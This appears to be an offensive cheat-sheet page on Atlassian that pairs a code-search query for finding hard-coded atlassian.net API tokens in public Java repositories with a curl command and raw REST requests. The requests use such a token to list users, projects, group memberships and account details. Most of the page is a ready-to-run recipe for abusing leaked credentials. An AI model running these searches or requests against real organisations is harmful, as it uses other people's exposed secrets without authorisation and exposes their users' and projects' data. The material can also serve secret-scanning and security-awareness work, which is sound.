---
description: >-
  Plan, track, and release world-class software with the number one software
  development tool for agile teams.
---

# Atlassian

## Search

```
/https?:\/\/[^\/\s]+\.atlassian\.net/ AND Authorization AND @ AND path:*.java NOT path:*.py NOT gmail.com NOT test NOT demo NOT example 
```

## Exploit

```
curl -u "username:ATATT3xFfGF0V99l_xxx551CCC5D" -H "Content-Type: application/json" https://*.atlassian.net/rest/api/3/user/groups?accountId=..
```

Get list user

```
GET /rest/api/3/users HTTP/2
Host: *.atlassian.net
Authorization: Basic username:token
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Cache-Control: max-age=0

OR

GET /rest/api/3/user/search?username=. HTTP/2
Host: *.atlassian.net
Authorization: Basic username:token
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Cache-Control: max-age=0


```

Get list project

```
GET /rest/api/3/project HTTP/2
Host: *.atlassian.net
Authorization: Basic username:token
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Cache-Control: max-age=0


```

Get current user infor

```
GET /rest/api/3/myself HTTP/2
Host: *.atlassian.net
Authorization: Basic username:token
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Cache-Control: max-age=0


```

